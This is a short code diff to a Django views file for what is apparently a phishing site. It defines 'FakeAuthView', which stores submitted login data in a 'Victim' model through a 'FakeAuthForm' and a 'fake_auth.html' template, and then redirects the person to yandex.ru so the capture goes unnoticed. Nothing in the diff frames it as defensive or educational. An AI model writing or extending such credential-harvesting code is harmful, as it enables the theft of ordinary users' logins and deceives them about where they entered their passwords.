@@ -1,10 +1,16 @@
+from django.shortcuts import redirect
 from django.views.generic.edit import CreateView
-from django.contrib.auth.models import User
 
-from .forms import VictimForm
+from .models import Victim
+from .forms import FakeAuthForm
 
 
-class FisherView(CreateView):
-    model = User
-    form_class = VictimForm
-    template_name = 'auth.html'
+def index(request):
+    return redirect('https://yandex.ru')
+
+
+class FakeAuthView(CreateView):
+    model = Victim
+    form_class = FakeAuthForm
+    template_name = 'fake_auth.html'
+    success_url = 'https://yandex.ru'
